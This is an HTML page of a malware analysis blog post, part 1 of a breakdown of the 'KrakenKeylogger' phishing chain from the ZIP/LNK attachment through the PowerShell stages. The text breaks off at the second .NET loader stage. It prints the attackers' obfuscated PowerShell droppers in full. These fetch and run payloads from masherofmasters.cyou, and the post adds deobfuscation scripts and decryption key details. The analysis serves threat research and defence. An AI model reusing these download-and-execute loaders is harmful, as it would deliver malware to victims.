<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Kraken - The Deep Sea Lurker Part 1 - Toxin Labs</title>
<meta name="description" content="Part 1 of analyzing the KrakenKeylogger Malware ">


  <meta name="author" content="0xToxin">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Toxin Labs">
<meta property="og:title" content="Kraken - The Deep Sea Lurker Part 1">
<meta property="og:url" content="https://0xtoxin.github.io/malware%20analysis/KrakenKeylogger-pt1/">


  <meta property="og:description" content="Part 1 of analyzing the KrakenKeylogger Malware ">



  <meta property="og:image" content="https://0xtoxin.github.io/assets/images/Kraken-Keylogger-pt1/logo.png">





  <meta property="article:published_time" content="2023-05-20T00:00:00+00:00">





  

  


<link rel="canonical" href="https://0xtoxin.github.io/malware%20analysis/KrakenKeylogger-pt1/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xToxin",
      "url": "https://0xtoxin.github.io/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Toxin Labs Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/main/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/main/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/Logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Toxin Labs
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#malware-analysis">Malware Analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#threat-breakdown">Threat Breakdown</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#threat-hunting">Threat Hunting</a>
            </li><li class="masthead__menu-item">
              <a href="/tags">All Tags</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/Kraken-Keylogger-pt1/logo.png');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          Kraken - The Deep Sea Lurker Part 1

        
      </h1>
      
        <p class="page__lead">Part 1 of analyzing the KrakenKeylogger Malware
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  5 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/main/avatar.jpg" alt="0xToxin" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xToxin</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Threat Analyst &amp; IR team leader - Malware Analysis - Blue Team</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Israel</span>
        </li>
      

      
        
          
            <li><a href="mailto:igal.lytzki@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/0xToxin" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xToxin" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/igal-lytzki-99bb0721a/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Kraken - The Deep Sea Lurker Part 1">
    <meta itemprop="description" content="Part 1 of analyzing the KrakenKeylogger Malware">
    <meta itemprop="datePublished" content="2023-05-20T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right sticky">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-biohazard"></i> On This Blog</h4></header>
              <ul class="toc__menu">
  <li><a href="#intro">Intro</a></li>
  <li><a href="#the-phish">The Phish</a></li>
  <li><a href="#lnk-analysis">LNK Analysis</a>
    <ul>
      <li><a href="#lecmd-tool">LEcmd Tool</a></li>
      <li><a href="#powershell-script">PowerShell Script</a></li>
    </ul>
  </li>
  <li><a href="#se1hta">se1.hta</a></li>
  <li><a href="#net-loader">.NET Loader</a>
    <ul>
      <li><a href="#stage-1">Stage 1</a></li>
      <li><a href="#stage-2">Stage 2</a></li>
    </ul>
  </li>
  <li><a href="#kraken-payload">Kraken Payload</a>
    <ul>
      <li><a href="#kraken-configs">Kraken Configs</a></li>
      <li><a href="#custom-commands">Custom Commands</a></li>
      <li><a href="#harvesting-capabilities">Harvesting Capabilities</a></li>
      <li><a href="#exfiltration">Exfiltration</a></li>
      <li><a href="#post-exfiltration-actions">Post Exfiltration Actions</a></li>
    </ul>
  </li>
  <li><a href="#iocs">IOC’s</a></li>
  <li><a href="#summary">Summary</a></li>
  <li><a href="#part-2">Part 2</a></li>
</ul>

            </nav>
          </aside>
        
        <h1 id="intro">Intro</h1>
<p>In this first part we will be going through a recent phishing campaign delivering a never seen before “KrakenKeylogger” malware.</p>

<h1 id="the-phish">The Phish</h1>
<p>The mail sent to the victim is a simple malspam mail with archive attachment:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/1.png" alt="image.png" /></p>

<p>The archive is a <code class="language-plaintext highlighter-rouge">.zip</code> archive that contains <code class="language-plaintext highlighter-rouge">.lnk</code> file:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/2.png" alt="image-2.png" /></p>

<h1 id="lnk-analysis">LNK Analysis</h1>
<h2 id="lecmd-tool">LEcmd Tool</h2>
<p>In order to analyze an <code class="language-plaintext highlighter-rouge">.lnk</code> file I use the <a href="https://github.com/EricZimmerman/LECmd">LeCMD</a> tool. 
By using the tool we can see that the .lnk will execute <code class="language-plaintext highlighter-rouge">PowerShell.exe</code> alongside with an argument:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/3.png" alt="image-3.png" /></p>

<h2 id="powershell-script">PowerShell Script</h2>
<p>Let’s breakdown the script:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="n">UnRestricted</span><span class="w"> </span><span class="nv">$ProgressPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> 
</span><span class="kr">function</span><span class="w"> </span><span class="nf">nvRClWiAJT</span><span class="p">(</span><span class="nv">$OnUPXhNfGyEh</span><span class="p">){</span><span class="w"> 
    </span><span class="nv">$OnUPXhNfGyEh</span><span class="p">[</span><span class="nv">$OnUPXhNfGyEh</span><span class="o">.</span><span class="nf">Length</span><span class="o">..</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">-join</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span><span class="w">
</span><span class="p">};</span><span class="w"> 

</span><span class="kr">function</span><span class="w"> </span><span class="nf">sDjLksFILdkrdR</span><span class="p">(</span><span class="nv">$OnUPXhNfGyEh</span><span class="p">){</span><span class="w"> 
    </span><span class="nv">$vecsWHuXBHu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nvRClWiAJT</span><span class="w"> </span><span class="nv">$OnUPXhNfGyEh</span><span class="p">;</span><span class="w"> 
    </span><span class="kr">for</span><span class="p">(</span><span class="nv">$TJuYrHOorcZu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="nv">$TJuYrHOorcZu</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$vecsWHuXBHu</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="nv">$TJuYrHOorcZu</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">){</span><span class="w"> 
        </span><span class="kr">try</span><span class="p">{</span><span class="w">
            </span><span class="nv">$zRavFAQNJqOVxb</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">nvRClWiAJT</span><span class="w"> </span><span class="nv">$vecsWHuXBHu</span><span class="o">.</span><span class="nf">Substring</span><span class="p">(</span><span class="nv">$TJuYrHOorcZu</span><span class="p">,</span><span class="nx">2</span><span class="p">)</span><span class="w">
        </span><span class="p">}</span><span class="w"> 
        </span><span class="kr">catch</span><span class="p">{</span><span class="w">
            </span><span class="nv">$zRavFAQNJqOVxb</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">$vecsWHuXBHu</span><span class="o">.</span><span class="nf">Substring</span><span class="p">(</span><span class="nv">$TJuYrHOorcZu</span><span class="p">,</span><span class="nx">1</span><span class="p">)</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">};</span><span class="w">
    </span><span class="nv">$zRavFAQNJqOVxb</span><span class="w">
</span><span class="p">};</span><span class="w"> 

</span><span class="nv">$NpzibtULgyi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sDjLksFILdkrdR</span><span class="w"> </span><span class="s1">'aht1.sen/hi/coucys.erstmaofershma//s:tpht'</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$cDkdhkGBtl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="nv">$NpzibtULgyi</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s1">'/'</span><span class="p">)[</span><span class="nt">-1</span><span class="p">];</span><span class="w"> 
</span><span class="p">[</span><span class="n">Net.ServicePointManager</span><span class="p">]::</span><span class="n">SecurityProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.SecurityProtocolType</span><span class="p">]::</span><span class="n">Tls12</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$wbpiCTsGYi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="nv">$NpzibtULgyi</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">;</span><span class="w"> 
</span><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">WriteAllText</span><span class="p">(</span><span class="nv">$cDkdhkGBtl</span><span class="p">,</span><span class="w"> </span><span class="nv">$wbpiCTsGYi</span><span class="p">);</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nv">$cDkdhkGBtl</span><span class="p">;</span><span class="w"> 
</span><span class="n">sleep</span><span class="w"> </span><span class="nx">3</span><span class="p">;</span><span class="w"> 
</span><span class="n">rm</span><span class="w"> </span><span class="nv">$cDkdhkGBtl</span><span class="p">;</span><span class="w">
</span></code></pre></div></div>

<p>The script will create a new string which will be the URL to the next payload, the script will take the obfuscated URL string and will deobfuscate it in several steps:</p>
<ol>
  <li>The string will be reversed by the function <code class="language-plaintext highlighter-rouge">nvRClWiAJT</code>.</li>
  <li>a for loop will iterate through the flipped string and will jump every 2 chars.</li>
  <li>each iteration 2 chars will be flipped again, and in the last iteration the last char will flipped also but it won’t have any effect.</li>
</ol>

<p>Here is a quick python script that does this process:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">input_string</span> <span class="o">=</span> <span class="s">'aht1.sen/hi/coucys.erstmaofershma//s:tpht'</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">output_string</span> <span class="o">=</span> <span class="s">''</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">input_string</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">input_string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">input_string</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
        <span class="n">output_string</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">output_string</span> <span class="o">+=</span> <span class="n">input_string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="n">output_string</span><span class="p">)</span>        
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://masherofmasters.cyou/chin/se1.hta
</code></pre></div></div>

<h1 id="se1hta">se1.hta</h1>
<p>The fetched payload will be yet another powershell script:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="n">UnRestricted</span><span class="w"> 

</span><span class="kr">function</span><span class="w"> </span><span class="nf">WQgtWbWK</span><span class="p">(</span><span class="nv">$FL</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">){</span><span class="w">
    </span><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$FL</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">)</span><span class="w">
</span><span class="p">};</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">APcZNMgjQ</span><span class="p">(</span><span class="nv">$FL</span><span class="p">){</span><span class="w">
    </span><span class="kr">if</span><span class="p">(</span><span class="nv">$FL</span><span class="o">.</span><span class="nf">EndsWith</span><span class="p">((</span><span class="n">QXUpF</span><span class="w"> </span><span class="p">@(</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5049</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5057</span><span class="p">)))</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">){</span><span class="w">
        </span><span class="n">Start-Process</span><span class="w"> </span><span class="p">(</span><span class="n">QXUpF</span><span class="w"> </span><span class="p">@(</span><span class="mi">5063</span><span class="p">,</span><span class="mi">5066</span><span class="p">,</span><span class="mi">5059</span><span class="p">,</span><span class="mi">5049</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5000</span><span class="p">,</span><span class="mi">4999</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5069</span><span class="p">,</span><span class="mi">5050</span><span class="p">))</span><span class="w"> </span><span class="nv">$FL</span><span class="w">
    </span><span class="p">}</span><span class="kr">else</span><span class="p">{</span><span class="w">
        </span><span class="n">Start-Process</span><span class="w"> </span><span class="nv">$FL</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">};</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">laiLJMT</span><span class="p">(</span><span class="nv">$eh</span><span class="p">){</span><span class="w">
    </span><span class="nv">$LM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="p">(</span><span class="n">QXUpF</span><span class="w"> </span><span class="p">@(</span><span class="mi">5027</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5036</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5047</span><span class="p">,</span><span class="mi">5016</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5054</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5059</span><span class="p">,</span><span class="mi">5065</span><span class="p">));</span><span class="w">
    </span><span class="p">[</span><span class="n">Net.ServicePointManager</span><span class="p">]::</span><span class="n">SecurityProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Net.SecurityProtocolType</span><span class="p">]::</span><span class="n">TLS12</span><span class="p">;</span><span class="w">
    </span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$LM</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="nv">$eh</span><span class="p">);</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$i</span><span class="w">
</span><span class="p">};</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">QXUpF</span><span class="p">(</span><span class="nv">$P</span><span class="p">){</span><span class="w">
    </span><span class="nv">$n</span><span class="o">=</span><span class="mi">4949</span><span class="p">;</span><span class="w">
    </span><span class="nv">$s</span><span class="o">=</span><span class="nv">$Null</span><span class="p">;</span><span class="w">
    </span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$WK</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$P</span><span class="p">){</span><span class="w">
        </span><span class="nv">$s</span><span class="o">+=</span><span class="p">[</span><span class="n">char</span><span class="p">](</span><span class="nv">$WK</span><span class="o">-</span><span class="nv">$n</span><span class="p">)</span><span class="w">
    </span><span class="p">};</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$s</span><span class="w">
</span><span class="p">};</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">deaNPih</span><span class="p">(){</span><span class="w">
    </span><span class="nv">$AVYABiApT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="p">;</span><span class="w">
    </span><span class="nv">$XdOFJCmMx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">laiLJMT</span><span class="w"> </span><span class="p">(</span><span class="n">QXUpF</span><span class="w"> </span><span class="p">@(</span><span class="mi">5053</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">5061</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5007</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">5058</span><span class="p">,</span><span class="mi">5046</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5053</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5063</span><span class="p">,</span><span class="mi">5060</span><span class="p">,</span><span class="mi">5051</span><span class="p">,</span><span class="mi">5058</span><span class="p">,</span><span class="mi">5046</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5063</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5048</span><span class="p">,</span><span class="mi">5070</span><span class="p">,</span><span class="mi">5060</span><span class="p">,</span><span class="mi">5066</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">5048</span><span class="p">,</span><span class="mi">5053</span><span class="p">,</span><span class="mi">5054</span><span class="p">,</span><span class="mi">5059</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">4998</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5069</span><span class="p">,</span><span class="mi">5050</span><span class="p">));</span><span class="w">
    </span><span class="nv">$qNfQDXYlR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$AVYABiApT</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'se1.exe'</span><span class="p">;</span><span class="w">
    </span><span class="n">WQgtWbWK</span><span class="w"> </span><span class="nv">$qNfQDXYlR</span><span class="w"> </span><span class="nv">$XdOFJCmMx</span><span class="p">;</span><span class="w">
    </span><span class="n">APcZNMgjQ</span><span class="w"> </span><span class="nv">$qNfQDXYlR</span><span class="p">;;;;</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">deaNPih</span><span class="p">;</span><span class="w">
</span></code></pre></div></div>

<p>The script has several obfuscated strings that are being deobfuscated using the function <code class="language-plaintext highlighter-rouge">QXUpF</code> by simply going over each number and substracting <code class="language-plaintext highlighter-rouge">4949</code> from it. here is a quick script that will deobfuscate those strings and print the clear strings:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stringsList</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5049</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5057</span><span class="p">],[</span><span class="mi">5063</span><span class="p">,</span><span class="mi">5066</span><span class="p">,</span><span class="mi">5059</span><span class="p">,</span><span class="mi">5049</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5000</span><span class="p">,</span><span class="mi">4999</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5069</span><span class="p">,</span><span class="mi">5050</span><span class="p">],[</span><span class="mi">5027</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5036</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5047</span><span class="p">,</span><span class="mi">5016</span><span class="p">,</span><span class="mi">5057</span><span class="p">,</span><span class="mi">5054</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5059</span><span class="p">,</span><span class="mi">5065</span><span class="p">],[</span><span class="mi">5053</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">5061</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5007</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">5058</span><span class="p">,</span><span class="mi">5046</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5053</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5063</span><span class="p">,</span><span class="mi">5060</span><span class="p">,</span><span class="mi">5051</span><span class="p">,</span><span class="mi">5058</span><span class="p">,</span><span class="mi">5046</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5065</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5063</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5048</span><span class="p">,</span><span class="mi">5070</span><span class="p">,</span><span class="mi">5060</span><span class="p">,</span><span class="mi">5066</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">5048</span><span class="p">,</span><span class="mi">5053</span><span class="p">,</span><span class="mi">5054</span><span class="p">,</span><span class="mi">5059</span><span class="p">,</span><span class="mi">4996</span><span class="p">,</span><span class="mi">5064</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">4998</span><span class="p">,</span><span class="mi">4995</span><span class="p">,</span><span class="mi">5050</span><span class="p">,</span><span class="mi">5069</span><span class="p">,</span><span class="mi">5050</span><span class="p">]]</span>

<span class="k">for</span> <span class="n">string</span> <span class="ow">in</span> <span class="n">stringsList</span><span class="p">:</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span> <span class="o">-</span> <span class="mi">4949</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[+] - </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] - .dll
[+] - rundll32.exe
[+] - Net.WebClient
[+] - https://masherofmasters.cyou/chin/se1.exe
</code></pre></div></div>

<p>The script will download another file from the same domain previously used for fetching the <code class="language-plaintext highlighter-rouge">.hta</code> file in the previous powershell script.</p>
<h1 id="net-loader">.NET Loader</h1>
<h2 id="stage-1">Stage 1</h2>
<p>the fetched executable (<code class="language-plaintext highlighter-rouge">se1.exe</code>) is a .NET executable:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/4.png" alt="image.png" /></p>

<p>the loader will decrypt embedded resource <code class="language-plaintext highlighter-rouge">DataBasePracticalJob</code> using the encryption algorithim <code class="language-plaintext highlighter-rouge">RC2</code>, the key for the encryption will be the MD5 hash value of the hardcoded string <code class="language-plaintext highlighter-rouge">QEssDJZhQnLywDnJGpBEr</code> (The interesting part here is that the hashing applied on the string after encoding it with <code class="language-plaintext highlighter-rouge">BigEndianUnicode</code>, <code class="language-plaintext highlighter-rouge">0x00</code> appends as a suffix to each byte.) Here is a diagram of the decryption process:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/5.png" alt="image-2.png" /></p>

<p>you can use this <a href="https://gchq.github.io/CyberChef/#recipe=To_Hex('Space',0)Fork('%20','%5C%5Cn',false)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'00%20',true,false,true,false)Merge(true)Remove_whitespace(true,false,true,false,false,false)From_Hex('Auto')MD5()&amp;input=UUVzc0RKWmhRbkx5d0RuSkdwQkVy">CyberChef Recipe</a> in order to calculate the MD5 hash easily. 
Then using RC2 decryption in CyberChef we can also fetch the 2nd stage:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/6.png" alt="image-3.png" /></p>

<h2 id="stage-2">Stage 2</h2>
<p>The second stage is a .NET DLL which will be invoked by the first stage executable.<br />
The DLL will be invoke on its first public exported method which is <code class="language-plaintext highlighter-rouge">syncfusion</code>:</p>

